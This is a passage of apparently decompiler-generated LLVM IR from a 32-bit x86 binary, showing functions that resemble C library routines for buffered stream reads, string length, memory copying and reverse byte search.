  uselistorder i32 %v1_804ffb9, { 1, 0 }
  uselistorder i32 %v3_804ffa7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp111, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 12, 13, 14, 15, 7, 5, 6, 4, 8, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 22, 23, 20, 21, 24, 27, 26, 28, 25, 29, 5, 8, 6, 9, 7, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 6, 5, 7, 8, 9, 4 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 16, 17, 15, 18, 19, 20, 21, 23, 22, 24, 14, 4, 5, 3, 9, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 11, 6, 7, 0, 4, 3, 1, 5, 2, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 8, 9, 10, 11, 4, 5, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050512, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050510, { 1, 0 }
  uselistorder label %dec_label_pc_805048f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050441, { 1, 0 }
  uselistorder label %dec_label_pc_8050419, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80503e8, { 1, 0 }
  uselistorder label %dec_label_pc_80503d5, { 1, 0 }
  uselistorder label %dec_label_pc_80503bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050388, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050373, { 1, 0 }
  uselistorder label %dec_label_pc_8050368, { 1, 0 }
  uselistorder label %dec_label_pc_80502ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80502e1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80502a7, { 1, 0 }
  uselistorder label %dec_label_pc_8050277.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050243, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050212, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80501fd, { 1, 0 }
  uselistorder label %dec_label_pc_80500b4, { 1, 0 }
  uselistorder label %dec_label_pc_804ffd8, { 1, 0 }
  uselistorder label %dec_label_pc_804ffcf, { 1, 0 }
}

define i32 @function_805054c() local_unnamed_addr {
dec_label_pc_805054c:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_805054c = load i32, i32* @ebx, align 4
  %v4_8050550 = ptrtoint i16* %tmp to i32
  store i32 %v4_8050550, i32* @ebx, align 4
  %v1_8050554 = add i32 %v4_8050550, 16
  %v2_8050554 = inttoptr i32 %v1_8050554 to i32*
  %v3_8050554 = load i32, i32* %v2_8050554, align 4
  %v2_8050557 = add i32 %v4_8050550, 24
  %v3_8050557 = inttoptr i32 %v2_8050557 to i32*
  %v4_8050557 = load i32, i32* %v3_8050557, align 4
  %v10_8050557 = icmp ult i32 %v3_8050554, %v4_8050557
  br i1 %v10_8050557, label %dec_label_pc_80505f9, label %dec_label_pc_8050560

dec_label_pc_8050560:                             ; preds = %dec_label_pc_805054c
  %v2_8050560 = load i16, i16* %tmp, align 2
  %v3_8050560 = zext i16 %v2_8050560 to i32
  %v1_8050563 = and i32 %v3_8050560, 131
  %v6_805056d = icmp ugt i32 %v1_8050563, 128
  br i1 %v6_805056d, label %dec_label_pc_8050587, label %dec_label_pc_805056f

dec_label_pc_805056f:                             ; preds = %dec_label_pc_8050560
  %v0_805056f = load i32, i32* @edx, align 4
  %v6_8050577 = call i32 @function_8051584(i16* nonnull %tmp, i32 128, i32 %v0_805056f, i32 %v0_805056f)
  %v1_805057f = icmp eq i32 %v6_8050577, 0
  %v1_8050581 = icmp eq i1 %v1_805057f, false
  br i1 %v1_8050581, label %dec_label_pc_805061e, label %dec_label_pc_805056f.dec_label_pc_8050587_crit_edge

dec_label_pc_805056f.dec_label_pc_8050587_crit_edge: ; preds = %dec_label_pc_805056f
  %v0_8050587.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050587

dec_label_pc_8050587:                             ; preds = %dec_label_pc_805056f.dec_label_pc_8050587_crit_edge, %dec_label_pc_8050560
  %v2_80505bb = phi i32 [ %v0_8050587.pre, %dec_label_pc_805056f.dec_label_pc_8050587_crit_edge ], [ %v4_8050550, %dec_label_pc_8050560 ]
  %v1_8050587 = inttoptr i32 %v2_80505bb to i32*
  %v2_8050587 = load i32, i32* %v1_8050587, align 4
  store i32 %v2_8050587, i32* @ecx, align 4
  %v1_8050589 = urem i32 %v2_8050587, 65536
  store i32 %v1_8050589, i32* %edx.global-to-local, align 4
  %v2_805058c = and i32 %v2_8050587, 2
  %v3_805058c = icmp eq i32 %v2_805058c, 0
  br i1 %v3_805058c, label %dec_label_pc_80505aa, label %dec_label_pc_8050591

dec_label_pc_8050591:                             ; preds = %dec_label_pc_8050587
  %v1_8050591 = urem i32 %v2_8050587, 2
  store i32 %v1_8050591, i32* %edx.global-to-local, align 4
  %v1_8050594 = add i32 %v2_8050587, 65535
  %v1_8050597 = trunc i32 %v1_8050594 to i16
  %v3_8050597 = inttoptr i32 %v2_80505bb to i16*
  store i16 %v1_8050597, i16* %v3_8050597, align 2
  %v0_805059a = load i32, i32* @ebx, align 4
  %v1_805059a = load i32, i32* %edx.global-to-local, align 4
  %v2_805059a = mul i32 %v1_805059a, 4
  %v3_805059a = add i32 %v0_805059a, 36
  %v4_805059a = add i32 %v3_805059a, %v2_805059a
  %v5_805059a = inttoptr i32 %v4_805059a to i8*
  %v6_805059a = load i8, i8* %v5_805059a, align 1
  %v7_805059a = zext i8 %v6_805059a to i32
  %v9_805059a = and i32 %v1_805059a, -256
  %v10_805059a = or i32 %v7_805059a, %v9_805059a
  store i32 %v10_805059a, i32* %edx.global-to-local, align 4
  %v1_805059e = add i32 %v0_805059a, 40
  %v2_805059e = inttoptr i32 %v1_805059e to i32*
  store i32 0, i32* %v2_805059e, align 4
  %v0_80505a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80505a5 = urem i32 %v0_80505a5, 256
  store i32 %v1_80505a5, i32* @edx, align 4
  br label %dec_label_pc_8050621

dec_label_pc_80505aa:                             ; preds = %dec_label_pc_8050587
  %v1_80505aa = add i32 %v2_80505bb, 16
  %v2_80505aa = inttoptr i32 %v1_80505aa to i32*
  %v3_80505aa = load i32, i32* %v2_80505aa, align 4
  store i32 %v3_80505aa, i32* @eax, align 4
  %v1_80505ad = add i32 %v2_80505bb, 20
  %v2_80505ad = inttoptr i32 %v1_80505ad to i32*
  %v3_80505ad = load i32, i32* %v2_80505ad, align 4
  %v15_80505ad = icmp eq i32 %v3_80505ad, %v3_80505aa
  %v1_80505b0 = icmp eq i1 %v15_80505ad, false
  br i1 %v1_80505b0, label %dec_label_pc_80505f9, label %dec_label_pc_80505b2

dec_label_pc_80505b2:                             ; preds = %dec_label_pc_80505aa
  %v1_80505b2 = add i32 %v2_80505bb, 4
  %v2_80505b2 = inttoptr i32 %v1_80505b2 to i32*
  %v3_80505b2 = load i32, i32* %v2_80505b2, align 4
  %v13_80505b2 = icmp eq i32 %v3_80505b2, -2
  %v1_80505b6 = icmp eq i1 %v13_80505b2, false
  br i1 %v1_80505b6, label %dec_label_pc_80505c0, label %dec_label_pc_80505b8

dec_label_pc_80505b8:                             ; preds = %dec_label_pc_80505b2
  %v1_80505b8 = or i32 %v2_8050587, 4
  store i32 %v1_80505b8, i32* @ecx, align 4
  %v1_80505bb = trunc i32 %v1_80505b8 to i16
  %v3_80505bb = inttoptr i32 %v2_80505bb to i16*
  store i16 %v1_80505bb, i16* %v3_80505bb, align 2
  br label %dec_label_pc_805061e

dec_label_pc_80505c0:                             ; preds = %dec_label_pc_80505b2
  %v1_80505c0 = udiv i32 %v2_8050587, 256
  %v2_80505c0 = trunc i32 %v1_80505c0 to i8
  %v3_80505c0 = urem i8 %v2_80505c0, 4
  %v4_80505c0 = icmp eq i8 %v3_80505c0, 0
  %v8_80505c0 = zext i8 %v3_80505c0 to i32
  %v10_80505c0 = mul nuw nsw i32 %v8_80505c0, 256
  %v11_80505c0 = urem i32 %v2_8050587, 256
  %v12_80505c0 = or i32 %v10_80505c0, %v11_80505c0
  store i32 %v12_80505c0, i32* %edx.global-to-local, align 4
  br i1 %v4_80505c0, label %dec_label_pc_80505d5, label %dec_label_pc_80505c5

dec_label_pc_80505c5:                             ; preds = %dec_label_pc_80505c0
  %v3_80505cd = call i32 @function_804ce30(i16* bitcast (i32** @global_var_8055e3c.118 to i16*))
  %v0_80505d5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80505d5

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_80505c0, %dec_label_pc_80505c5
  %v0_805060a = phi i32 [ %v2_80505bb, %dec_label_pc_80505c0 ], [ %v0_80505d5.pre, %dec_label_pc_80505c5 ]
  %v1_80505d5 = add i32 %v0_805060a, 8
  %v2_80505d5 = inttoptr i32 %v1_80505d5 to i32*
  %v3_80505d5 = load i32, i32* %v2_80505d5, align 4
  %v1_80505d8 = add i32 %v0_805060a, 12
  %v2_80505d8 = inttoptr i32 %v1_80505d8 to i32*
  %v3_80505d8 = load i32, i32* %v2_80505d8, align 4
  %v15_80505d8 = icmp eq i32 %v3_80505d8, %v3_80505d5
  br i1 %v15_80505d8, label %dec_label_pc_8050602, label %dec_label_pc_80505dd

dec_label_pc_80505dd:                             ; preds = %dec_label_pc_80505d5
  %v2_80505e0 = add i32 %v0_805060a, 24
  %v3_80505e0 = inttoptr i32 %v2_80505e0 to i32*
  store i32 %v3_80505d5, i32* %v3_80505e0, align 4
  %v0_80505e3 = load i32, i32* @ebx, align 4
  %v2_80505e4 = call i32 @function_805155c(i32 %v0_80505e3)
  %v1_80505ec = icmp eq i32 %v2_80505e4, 0
  br i1 %v1_80505ec, label %dec_label_pc_805061e, label %dec_label_pc_80505f0

dec_label_pc_80505f0:                             ; preds = %dec_label_pc_80505dd
  %v0_80505f0 = load i32, i32* @ebx, align 4
  %v1_80505f0 = add i32 %v0_80505f0, 20
  %v2_80505f0 = inttoptr i32 %v1_80505f0 to i32*
  %v3_80505f0 = load i32, i32* %v2_80505f0, align 4
  %v2_80505f3 = add i32 %v0_80505f0, 24
  %v3_80505f3 = inttoptr i32 %v2_80505f3 to i32*
  store i32 %v3_80505f0, i32* %v3_80505f3, align 4
  %v0_80505f6 = load i32, i32* @ebx, align 4
  %v1_80505f6 = add i32 %v0_80505f6, 16
  %v2_80505f6 = inttoptr i32 %v1_80505f6 to i32*
  %v3_80505f6 = load i32, i32* %v2_80505f6, align 4
  br label %dec_label_pc_80505f9

dec_label_pc_80505f9:                             ; preds = %dec_label_pc_80505aa, %dec_label_pc_805054c, %dec_label_pc_80505f0
  %v1_80505fd = phi i32 [ %v2_80505bb, %dec_label_pc_80505aa ], [ %v4_8050550, %dec_label_pc_805054c ], [ %v0_80505f6, %dec_label_pc_80505f0 ]
  %v0_80505f9 = phi i32 [ %v3_80505aa, %dec_label_pc_80505aa ], [ %v3_8050554, %dec_label_pc_805054c ], [ %v3_80505f6, %dec_label_pc_80505f0 ]
  %v1_80505f9 = inttoptr i32 %v0_80505f9 to i8*
  %v2_80505f9 = load i8, i8* %v1_80505f9, align 1
  %v3_80505f9 = zext i8 %v2_80505f9 to i32
  store i32 %v3_80505f9, i32* @edx, align 4
  %v1_80505fc = add i32 %v0_80505f9, 1
  %v2_80505fd = add i32 %v1_80505fd, 16
  %v3_80505fd = inttoptr i32 %v2_80505fd to i32*
  store i32 %v1_80505fc, i32* %v3_80505fd, align 4
  %v0_8050621.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050621

dec_label_pc_8050602:                             ; preds = %dec_label_pc_80505d5
  %v2_8050605 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805060a = inttoptr i32 %v0_805060a to i16*
  %v5_805060b = call i32 @function_8051470(i16* %v5_805060a, i32 %v2_8050605, i32 1)
  %v1_8050613 = icmp eq i32 %v5_805060b, 0
  br i1 %v1_8050613, label %dec_label_pc_805061e, label %dec_label_pc_8050617

dec_label_pc_8050617:                             ; preds = %dec_label_pc_8050602
  %v3_8050617 = load i8, i8* %stack_var_-5, align 1
  %v4_8050617 = sext i8 %v3_8050617 to i32
  store i32 %v4_8050617, i32* @edx, align 4
  br label %dec_label_pc_8050621

dec_label_pc_805061e:                             ; preds = %dec_label_pc_8050602, %dec_label_pc_80505dd, %dec_label_pc_805056f, %dec_label_pc_80505b8
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8050621

dec_label_pc_8050621:                             ; preds = %dec_label_pc_8050617, %dec_label_pc_80505f9, %dec_label_pc_8050591, %dec_label_pc_805061e
  %v0_8050621 = phi i32 [ %v4_8050617, %dec_label_pc_8050617 ], [ %v0_8050621.pre, %dec_label_pc_80505f9 ], [ %v1_80505a5, %dec_label_pc_8050591 ], [ -1, %dec_label_pc_805061e ]
  store i32 %v0_805054c, i32* @ebx, align 4
  ret i32 %v0_8050621

; uselistorder directives
  uselistorder i32 %v0_80505f9, { 1, 0 }
  uselistorder i32 %v3_80505d5, { 1, 0 }
  uselistorder i32 %v0_805060a, { 0, 1, 3, 2 }
  uselistorder i8 %v3_80505c0, { 1, 0 }
  uselistorder i32 %v3_80505aa, { 1, 0, 2 }
  uselistorder i32 %v1_80505a5, { 1, 0 }
  uselistorder i32 %v2_8050587, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_80505bb, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8050621, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805061e, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80505f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80505d5, { 1, 0 }
}

define i32 @function_8050628(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050628:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8050628 = load i32, i32* @edi, align 4
  store i32 %v0_8050628, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_805062f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805062f, i32* %edi.global-to-local, align 4
  %v1_8050637 = icmp eq i32 %arg3, 0
  store i1 %v1_8050637, i1* %zf.global-to-local, align 1
  br i1 %v1_8050637, label %dec_label_pc_8050647, label %dec_label_pc_805063b

dec_label_pc_805063b:                             ; preds = %dec_label_pc_8050628
  %v2_805063b = call i32 @_strlen(i8* %arg1)
  %v3_805063b = mul i32 %v2_805063b, -1
  %v4_805063b = add i32 %v3_805063b, -2
  store i32 %v4_805063b, i32* @ecx, align 4
  %v0_805063d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805063d, label %dec_label_pc_805063b.dec_label_pc_8050644_crit_edge, label %dec_label_pc_805063f

dec_label_pc_805063b.dec_label_pc_8050644_crit_edge: ; preds = %dec_label_pc_805063b
  %v0_8050644.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8050644.pre, -1
  br label %dec_label_pc_8050644

dec_label_pc_805063f:                             ; preds = %dec_label_pc_805063b
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050644

dec_label_pc_8050644:                             ; preds = %dec_label_pc_805063b.dec_label_pc_8050644_crit_edge, %dec_label_pc_805063f
  %v0_8050644 = phi i32 [ %phitmp, %dec_label_pc_805063b.dec_label_pc_8050644_crit_edge ], [ 0, %dec_label_pc_805063f ]
  %v8_8050644 = icmp eq i32 %v0_8050644, 0
  store i1 %v8_8050644, i1* %zf.global-to-local, align 1
  store i32 %v0_8050644, i32* %edi.global-to-local, align 4
  %v2_8050649.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050647

dec_label_pc_8050647:                             ; preds = %dec_label_pc_8050628, %dec_label_pc_8050644
  %v2_8050649 = phi i32 [ %v0_8050628, %dec_label_pc_8050628 ], [ %v2_8050649.pre, %dec_label_pc_8050644 ]
  %v0_8050647 = phi i32 [ 0, %dec_label_pc_8050628 ], [ %v0_8050644, %dec_label_pc_8050644 ]
  store i32 %v2_8050649, i32* @edi, align 4
  ret i32 %v0_8050647

; uselistorder directives
  uselistorder i32 %v0_8050644, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8050647, { 1, 0 }
  uselistorder label %dec_label_pc_8050644, { 1, 0 }
}

define i32 @function_805064c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805064c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_805064d = load i32, i32* @esi, align 4
  store i32 %v0_805064d, i32* %stack_var_-8, align 4
  %v4_805064e = ptrtoint i8* %arg1 to i32
  %v9_805065a = icmp ugt i8* %tmp3, %arg1
  %v1_805065c = icmp eq i1 %v9_805065a, false
  br i1 %v1_805065c, label %dec_label_pc_8050664, label %dec_label_pc_805065e

dec_label_pc_805065e:                             ; preds = %dec_label_pc_805064c
  %v7_8050660 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8050670

dec_label_pc_8050664:                             ; preds = %dec_label_pc_805064c
  %v3_8050664 = add i32 %arg2, -1
  %v4_8050664 = add i32 %v3_8050664, %tmp
  %v5_8050664 = inttoptr i32 %v4_8050664 to i8*
  %v3_8050668 = add i32 %v4_805064e, -1
  %v4_8050668 = add i32 %v3_8050668, %tmp
  %v5_8050668 = inttoptr i32 %v4_8050668 to i8*
  %v7_805066d = call i8* @_memcpy(i8* %v5_8050668, i8* %v5_8050664, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8050670

dec_label_pc_8050670:                             ; preds = %dec_label_pc_805065e, %dec_label_pc_8050664
  %v2_8050670 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050670, i32* @esi, align 4
  ret i32 %v4_805064e

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050670, { 1, 0 }
}

define i32 @function_8050674(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050674:
  %v0_8050674 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8050687 = inttoptr i32 %arg1 to i16*
  %v4_8050687 = call i32 @function_804d150(i16* %v3_8050687, i32 %arg2, i32 %arg3)
  %v0_805068c = load i32, i32* @esi, align 4
  %v2_805068c = add i32 %v0_805068c, %arg3
  store i32 %v0_8050674, i32* @esi, align 4
  ret i32 %v2_805068c
}

define i32 @function_8050698(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050698:
  %tmp = trunc i32 %arg2 to i8
  %v4_805069d = urem i32 %arg2, 256
  %v4_80506a9 = sext i8 %arg1 to i32
  %v2_80506ad = add i32 %v4_80506a9, %arg3
  %v1_80506bf7 = icmp eq i32 %arg3, 0
  br i1 %v1_80506bf7, label %dec_label_pc_80506c7, label %dec_label_pc_80506c3

dec_label_pc_80506b1:                             ; preds = %dec_label_pc_80506c3
  %v1_80506b1 = add i32 %v0_80506b1, -1
  %v5_80506b2 = load i32, i32* @edx, align 4
  %v6_80506b2 = and i32 %v5_80506b2, -256
  %v7_80506b2 = or i32 %v6_80506b2, %v4_805069d
  store i32 %v7_80506b2, i32* @edx, align 4
  %v1_80506b6 = inttoptr i32 %v1_80506b1 to i8*
  %v2_80506b6 = load i8, i8* %v1_80506b6, align 1
  %v15_80506b6 = icmp eq i8 %v2_80506b6, %tmp
  br i1 %v15_80506b6, label %dec_label_pc_8050744, label %dec_label_pc_80506be

dec_label_pc_80506be:                             ; preds = %dec_label_pc_80506b1
  %v1_80506be = add i32 %v0_80506be, -1
  %v8_80506be = icmp eq i32 %v1_80506be, 0
  br i1 %v8_80506be, label %dec_label_pc_80506c7, label %dec_label_pc_80506c3

dec_label_pc_80506c3:                             ; preds = %dec_label_pc_8050698, %dec_label_pc_80506be
  %v0_80506be = phi i32 [ %v1_80506be, %dec_label_pc_80506be ], [ %arg3, %dec_label_pc_8050698 ]
  %v0_80506b1 = phi i32 [ %v1_80506b1, %dec_label_pc_80506be ], [ %v2_80506ad, %dec_label_pc_8050698 ]
  %v2_80506c3 = urem i32 %v0_80506b1, 4
  %v3_80506c3 = icmp eq i32 %v2_80506c3, 0
  %v1_80506c5 = icmp eq i1 %v3_80506c3, false
  br i1 %v1_80506c5, label %dec_label_pc_80506b1, label %dec_label_pc_80506c7

dec_label_pc_80506c7:                             ; preds = %dec_label_pc_80506be, %dec_label_pc_80506c3, %dec_label_pc_8050698
  %v0_805072a.pr = phi i32 [ 0, %dec_label_pc_8050698 ], [ 0, %dec_label_pc_80506be ], [ %v0_80506be, %dec_label_pc_80506c3 ]
  %v0_80506cc = phi i32 [ %v2_80506ad, %dec_label_pc_8050698 ], [ %v1_80506b1, %dec_label_pc_80506be ], [ %v0_80506b1, %dec_label_pc_80506c3 ]
  store i32 %v0_80506cc, i32* @ecx, align 4
  %v2_80506d0 = mul nuw nsw i32 %v4_805069d, 256
  %v2_80506d3 = or i32 %v2_80506d0, %v4_805069d
  %v2_80506d7 = mul i32 %v2_80506d3, 65536
  %v2_80506da = or i32 %v2_80506d7, %v2_80506d3
  %v6_805072d50 = icmp ugt i32 %v0_805072a.pr, 3
  br i1 %v6_805072d50, label %dec_label_pc_80506de, label %dec_label_pc_805072f

dec_label_pc_80506de:                             ; preds = %dec_label_pc_80506c7, %dec_label_pc_8050727
  %v0_805072752 = phi i32 [ %v1_8050727, %dec_label_pc_8050727 ], [ %v0_805072a.pr, %dec_label_pc_80506c7 ]
  %v0_80506de51 = phi i32 [ %v1_80506de, %dec_label_pc_8050727 ], [ %v0_80506cc, %dec_label_pc_80506c7 ]
  %v1_80506de = add i32 %v0_80506de51, -4
  store i32 %v1_80506de, i32* @ecx, align 4
  %v2_80506e3 = inttoptr i32 %v1_80506de to i32*
  %v3_80506e3 = load i32, i32* %v2_80506e3, align 4
  %v4_80506e3 = xor i32 %v3_80506e3, %v2_80506da
  %v1_80506e5 = add i32 %v4_80506e3, 2130640639
  %v1_80506eb = sub i32 -1, %v4_80506e3
  %v2_80506ed = xor i32 %v1_80506e5, %v1_80506eb
  %v1_80506ef = and i32 %v2_80506ed, -2130640640
  %v2_80506ef = icmp eq i32 %v1_80506ef, 0
  br i1 %v2_80506ef, label %dec_label_pc_8050727, label %dec_label_pc_80506f7

dec_label_pc_80506f7:                             ; preds = %dec_label_pc_80506de
  %v7_80506f7 = or i32 %v1_80506ef, %v4_805069d
  %v1_80506fb = add i32 %v0_80506de51, -1
  %v2_80506fe = inttoptr i32 %v1_80506fb to i8*
  %v3_80506fe = load i8, i8* %v2_80506fe, align 1
  %v16_80506fe = icmp eq i8 %v3_80506fe, %tmp
  br i1 %v16_80506fe, label %dec_label_pc_8050744, label %dec_label_pc_8050703

dec_label_pc_8050703:                             ; preds = %dec_label_pc_80506f7
  %v1_8050707 = add i32 %v0_80506de51, -2
  %v2_805070a = inttoptr i32 %v1_8050707 to i8*
  %v3_805070a = load i8, i8* %v2_805070a, align 1
  %v16_805070a = icmp eq i8 %v3_805070a, %tmp
  br i1 %v16_805070a, label %dec_label_pc_8050744, label %dec_label_pc_805070f

dec_label_pc_805070f:                             ; preds = %dec_label_pc_8050703
  %v1_8050713 = add i32 %v0_80506de51, -3
  %v2_8050716 = inttoptr i32 %v1_8050713 to i8*
  %v3_8050716 = load i8, i8* %v2_8050716, align 1
  %v16_8050716 = icmp eq i8 %v3_8050716, %tmp
  br i1 %v16_8050716, label %dec_label_pc_8050744, label %dec_label_pc_805071b

dec_label_pc_805071b:                             ; preds = %dec_label_pc_805070f
  %v1_805071f = inttoptr i32 %v1_80506de to i8*
  %v2_805071f = load i8, i8* %v1_805071f, align 1
  %v15_805071f = icmp eq i8 %v2_805071f, %tmp
  %v1_8050721 = icmp eq i1 %v15_805071f, false
  br i1 %v1_8050721, label %dec_label_pc_8050727, label %dec_label_pc_8050723

dec_label_pc_8050723:                             ; preds = %dec_label_pc_805071b
  br label %dec_label_pc_8050744

dec_label_pc_8050727:                             ; preds = %dec_label_pc_805071b, %dec_label_pc_80506de
  %v5_805073427 = phi i32 [ %v7_80506f7, %dec_label_pc_805071b ], [ 0, %dec_label_pc_80506de ]
  %v1_8050727 = add i32 %v0_805072752, -4
  %v6_805072d = icmp ugt i32 %v1_8050727, 3
  br i1 %v6_805072d, label %dec_label_pc_80506de, label %dec_label_pc_805072f

dec_label_pc_805072f:                             ; preds = %dec_label_pc_8050727, %dec_label_pc_80506c7
  %v5_805073426.lcssa = phi i32 [ %v4_805069d, %dec_label_pc_80506c7 ], [ %v5_805073427, %dec_label_pc_8050727 ]
  %v0_80506de.lcssa = phi i32 [ %v0_80506cc, %dec_label_pc_80506c7 ], [ %v1_80506de, %dec_label_pc_8050727 ]
  %v0_8050727.lcssa = phi i32 [ %v0_805072a.pr, %dec_label_pc_80506c7 ], [ %v1_8050727, %dec_label_pc_8050727 ]
  br label %dec_label_pc_805073c

dec_label_pc_8050733:                             ; preds = %dec_label_pc_805073c
  %v1_805073c = add i32 %v0_805073c, -1
  %v1_8050733 = add i32 %v0_8050733, -1
  %v6_8050734 = and i32 %v5_8050734, -256
  %v7_8050734 = or i32 %v6_8050734, %v4_805069d
  %v1_8050738 = inttoptr i32 %v1_8050733 to i8*
  %v2_8050738 = load i8, i8* %v1_8050738, align 1
  %v15_8050738 = icmp eq i8 %v2_8050738, %tmp
  br i1 %v15_8050738, label %dec_label_pc_8050744, label %dec_label_pc_805073c

dec_label_pc_805073c:                             ; preds = %dec_label_pc_8050733, %dec_label_pc_805072f
  %v5_8050734 = phi i32 [ %v7_8050734, %dec_label_pc_8050733 ], [ %v5_805073426.lcssa, %dec_label_pc_805072f ]
  %v0_8050733 = phi i32 [ %v1_8050733, %dec_label_pc_8050733 ], [ %v0_80506de.lcssa, %dec_label_pc_805072f ]
  %v0_805073c = phi i32 [ %v1_805073c, %dec_label_pc_8050733 ], [ %v0_8050727.lcssa, %dec_label_pc_805072f ]
  %v10_805073d = icmp eq i32 %v0_805073c, 0
  %v1_8050740 = icmp eq i1 %v10_805073d, false
  br i1 %v1_8050740, label %dec_label_pc_8050733, label %dec_label_pc_8050742

dec_label_pc_8050742:                             ; preds = %dec_label_pc_805073c
  br label %dec_label_pc_8050744

dec_label_pc_8050744:                             ; preds = %dec_label_pc_80506b1, %dec_label_pc_805070f, %dec_label_pc_8050703, %dec_label_pc_80506f7, %dec_label_pc_8050733, %dec_label_pc_8050723, %dec_label_pc_8050742
  %v0_8050747 = phi i32 [ %v1_80506de, %dec_label_pc_8050723 ], [ 0, %dec_label_pc_8050742 ], [ %v1_8050733, %dec_label_pc_8050733 ], [ %v1_8050713, %dec_label_pc_805070f ], [ %v1_8050707, %dec_label_pc_8050703 ], [ %v1_80506fb, %dec_label_pc_80506f7 ], [ %v1_80506b1, %dec_label_pc_80506b1 ]
  ret i32 %v0_8050747

; uselistorder directives
  uselistorder i32 %v0_805073c, { 1, 0 }
  uselistorder i32 %v1_8050727, { 0, 2, 1 }
  uselistorder i32 %v1_80506de, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80506de51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80506d3, { 1, 0 }
  uselistorder i32 %v0_80506b1, { 1, 0, 2 }
  uselistorder i32 %v2_80506ad, { 1, 0 }
  uselistorder i32 %v4_805069d, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050744, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80506de, { 1, 0 }
  uselistorder label %dec_label_pc_80506c7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80506c3, { 1, 0 }
}

define i32 @function_8050748(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050748:
